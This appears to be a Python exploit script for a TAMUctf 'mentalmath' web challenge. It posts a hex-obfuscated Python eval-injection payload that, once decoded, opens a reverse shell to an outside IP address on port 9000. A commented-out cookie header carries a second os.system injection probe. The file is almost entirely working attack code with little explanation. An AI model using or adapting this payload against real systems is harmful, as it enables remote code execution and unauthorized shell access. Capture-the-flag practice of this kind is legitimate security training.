import requests as req

#post to new_problem gives us a new problem and says that correct is true meaning the previous must have to have been solved...
#as long as correct is true


headers = {
    'Host': 'mentalmath.tamuctf.com',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://mentalmath.tamuctf.com/play/',
    'Content-Type': 'application/x-www-form-urlencoded;',
    'X-Requested-With': 'XMLHttpRequest',
    #'Cookie':"Vary=__import__('os').system('ls')"
}
r = req.post('http://mentalmath.tamuctf.com/ajax/new_problem?answer=""&problem=\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x70\x79\x74\x68\x6f\x6e\x33\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x5c\x22\x33\x2e\x31\x34\x2e\x36\x37\x2e\x38\x35\x5c\x22\x2c\x39\x30\x30\x30\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x70\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x63\x61\x6c\x6c\x28\x5b\x5c\x22\x2f\x62\x69\x6e\x2f\x73\x68\x5c\x22\x2c\x5c\x22\x2d\x69\x5c\x22\x5d\x29\x27\x22\x29"')
print(r.text)


#function submitProblem() {
#    $.post("/ajax/new_problem", {'problem': $("#problem").html(), 'answer': $('#answer').val()}, function ( data ) {
#      if (data.correct) {
#        $('#problem').html(data.problem);
#        $('#answer').val('');
#      }
#    });
#  }

#$(document).ready(function() {
#  $("#answer").on('input', submitProblem);
#  submitProblem();
#});
